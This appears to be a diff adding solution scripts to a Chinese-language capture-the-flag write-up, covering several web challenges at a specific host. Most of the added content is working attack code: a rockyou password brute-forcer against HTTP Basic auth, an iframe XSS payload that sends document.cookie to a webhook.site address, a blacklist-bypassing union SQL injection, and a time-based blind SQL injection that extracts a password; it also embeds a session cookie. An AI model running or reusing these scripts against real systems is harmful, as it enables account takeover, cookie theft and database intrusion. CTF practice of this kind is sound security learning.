@@ -11,6 +11,124 @@
 
 ## 01. Monster
 
+```py
+from base64 import b64encode
+import time
+import requests
+from requests.exceptions import ReadTimeout, ConnectTimeout
+from fake_useragent import UserAgent
+
+login_url = 'http://140.115.59.7:12002/admin'
+
+ua = UserAgent()
+
+login_headers = {
+    "Host": "140.115.59.7:12002",
+    "Cache-Control": "max-age=0",
+    "Authorization": None,
+    "Upgrade-Insecure-Requests": "1",
+    "User-Agent": ua.random,
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "Referer": "http://140.115.59.7:12002/",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,ja;q=0.6,zh-CN;q=0.5,yo;q=0.4",
+    "Connection": "close"
+}
+
+
+def set_login(username, password):
+    authorization = b64encode(f"{username}:{password}".encode('utf-8')).decode('ascii')
+    login_headers["Authorization"] = f"Basic {authorization}"
+
+count = 0
+with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
+    for line in rockyou:
+        count += 1
+        line = line.strip()
+        print(f"try {count} password: {line}")
+        set_login("hitori", line)
+        while True:
+            try:
+                response = requests.request(
+                    method="GIVEMEFLAG", 
+                    url=login_url, 
+                    headers=login_headers, 
+                    timeout=1
+                )
+                break
+            except ReadTimeout:
+                print("read timeout, retry")
+            except ConnectTimeout:
+                print("connect timeout, retry")
+        if 'You have not been verified' not in response.text:
+            print(f"found password!: {line}")
+            with open('output.txt', 'w') as output_file:
+                output_file.write(f"found password!: {line}\n")  # Write to file
+            break
+        # time.sleep(0.5)
+```
+
+## 03. Meow
+    
+```py
+import requests
+import json
+
+url_submit = "http://140.115.59.7:12004/api/submit"
+url_score = "http://140.115.59.7:12004/api/score"
+
+headers_submit = {
+    "Host": "140.115.59.7:12004",
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Content-Type": "application/json",
+    "Accept": "*/*",
+    "Origin": "http://140.115.59.7:12004",
+    "Referer": "http://140.115.59.7:12004/",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,ja;q=0.6,zh-CN;q=0.5,yo;q=0.4",
+    "Cookie": "session=.eJwNwoENwCAIBMBdmADwK9ptQCFxhqa7t5d7KM-mm3Kx9ynCnWcJ70LTMkCikv-o2Fzm5sBlrTQjdDUfS8eYMHo_BF4Ulg.ZZEk1A.x2q5KgJIfuXayc_2fHhFBBTQqxY",
+    "Connection": "close"
+}
+
+headers_score = {
+    "Host": "140.115.59.7:12004",
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept": "*/*",
+    "Referer": "http://140.115.59.7:12004/",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,ja;q=0.6,zh-CN;q=0.5,yo;q=0.4",
+    "Cookie": "session=.eJwNwoENwCAIBMBdmADwK9ptQCFxhqa7t5d7KM-mm3Kx9ynCnWcJ70LTMkCikv-o2Fzm5sBlrTQjdDUfS8eYMHo_BF4Ulg.ZZEk1A.x2q5KgJIfuXayc_2fHhFBBTQqxY",
+    "Connection": "close"
+}
+
+data = [ [None for i in range(10)] for _ in range(10)]
+
+for i in range(10):
+    for j in range(10):
+        for ans in range(4):
+            data[i][j] = ans
+            requests.post(url_submit, headers=headers_submit, data=json.dumps(data))
+            response = requests.get(url_score, headers=headers_score)
+            if i*10 + j+1 == response.json()["data"]["score"]:
+                print(f"ans: {ans}")
+                break
+            
+print(data)
+```
+
+## 04. MSG Board
+
+```js
+<div>
+    <iframe
+        onload="window.location.href='https://webhook.site/64b07ebb-14b9-4b5a-91f8-bd5a5413c0cb'+escape(document.cookie)">
+</div>
+
+</div><iframe
+    onload="window.location.href='https://webhook.site/64b07ebb-14b9-4b5a-91f8-bd5a5413c0cb'+escape(document.cookie)">
+    <div></div>
+```
+
 ## 05. Command Injection
 
 ```php
@@ -143,6 +261,176 @@ json_to_send = '''{"bocchi":"'`c""at fl""ag`'"}'''
 
 # Call the function to send JSON data to the form
 send_json_to_form(json_to_send)
+```
+
+## 06. SQL Injection 1
+
+```php
+<?php
+isset($_GET['source']) and die(show_source(__FILE__, true));
+?>
+
+<?php
+$host = 'isostagram_db';
+$dbuser = 'MYSQL_USER';
+$dbpassword = 'MYSQL_PASSWORD';
+$dbname = 'ctf_users';
+$link = mysqli_connect($host, $dbuser, $dbpassword, $dbname);
+
+$loginStatus = NULL;
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+if (isset($username) && isset($password)) {
+    error_log('POST: [' . $username . '] [' . $password . ']');
+    if ($link) {
+        $blacklist = array("ununionion", "union", "selselectect", "select", "where", "and", "or");
+        $replace = array("", "", "", "", "","","");
+        $username = str_ireplace($blacklist, $replace, $username);
+        $password = str_ireplace($blacklist, $replace, $password);
+        $sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";
+        $query = mysqli_query($link, $sql);
+        @$fetchs = mysqli_fetch_all($query, MYSQLI_ASSOC);
+        if (@count($fetchs) > 0) {
+            foreach ($fetchs as $fetch) {
+                if ($fetch["username"] === 'idtjohn88' && $fetch["password"] === $password) {
+                    $loginStatus = True;
+                    break;
+                }
+                $loginStatus = False;
+            }
+        } else {
+            $loginStatus = False;
+        }
+    } else {
+        $loginStatus = NULL;
+    }
+} else {
+    $loginStatus = NULL;
+}
+?>
+```
+
+從上面的 Source Code 我們看到了一個重點：
+
+```php
+if ($fetch["username"] === 'idtjohn88' && $fetch["password"] === $password) {
+    $loginStatus = True;
+    break;
+}
+```
+
+我們會需要一個名為 `idtjohn88` 的使用者，
+
+```py
+import requests
+
+# Define the target URL
+url = 'http://140.115.59.7:12005/'  # Replace 'your_website_url_here' with the actual URL
+
+# Set your username and password
+# username = '''AND 1=1--'''
+# password = '''AND 1=1--'''
+
+# username = '''' or '1'='1'''
+# password = '''' or '1'='1'''
+
+# username = '''idtjohn88'''
+# password = '''' or '1'='1'''
+
+username = '''' uniounionn selecselectt NULL, 'idtjohn88', 'z'-- '''
+password = '''z'''
+
+
+# Craft the POST request data
+data = {
+    'username': username,
+    'password': password,
+    'submit': 'ログイン'  # Replace with the appropriate button text if needed
+}
+
+# Send the POST request
+response = requests.post(url, data=data)
+
+# Check if the login status message is present in the response HTML
+if 'alert alert-danger d-flex align-items-center' in response.text:
+    # If the login status message is found, print it
+    print("Login failed: Invalid username or password")
+else:
+    # If the login status message is not found, consider the login successful
+    print("SQL Injection successful!")
+```
+
+## 07. SQL Injection 2
+
+接續上題
+
+```py
+import requests
+import time
+
+# Define the URL and the POST data
+url = "http://140.115.59.7:12005/"
+data = {
+    "username": None,
+    "password": "arbitrary password",
+    "submit": "",
+}
+
+# Headers based on the provided HTTP request
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,ja;q=0.6,zh-CN;q=0.5,yo;q=0.4",
+    "Connection": "close",
+    "Cache-Control": "max-age=0",
+    "Upgrade-Insecure-Requests": "1",
+    "Origin": "http://140.115.59.7:12005",
+    "Referer": "http://140.115.59.7:12005/"
+}
+
+
+# password character
+lowercase_letters = list('abcdefghijklmnopqrstuvwxyz')
+uppercase_letters = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
+digits = list('0123456789')
+special_characters = list('!@#$%^&*()-_=+[]{}|;:\'",.<>/?`~\\')
+
+# Combine all the characters
+combined_list = (
+    lowercase_letters + 
+    uppercase_letters + 
+    digits + 
+    special_characters
+)
+
+flag = ""
+count = 1
+# Measure the time taken for the request
+while True:
+    for char in combined_list:
+        # SQL injection
+        data["username"] = f"' oorr IF((BINARY SUBSTRING((sselectelect `passwoorrd` from users wwherehere `username`='idtjohn88'),{count},1)='{char}'), SLEEP(1),0) -- "
+
+        start_time = time.time()
+        response = requests.post(
+            url=url, 
+            data=data, 
+            headers=headers
+        )
+        end_time = time.time()
+
+        # Calculate the duration
+        duration = end_time - start_time
+        print(f"char: {char} Duration: {duration.__round__(2)} seconds")
+        # time.sleep(1)
+        if duration > 5:
+            flag = flag + char
+            print(flag)
+            count += 1
+            break
 ```
 
 ## CONTACT INFO.
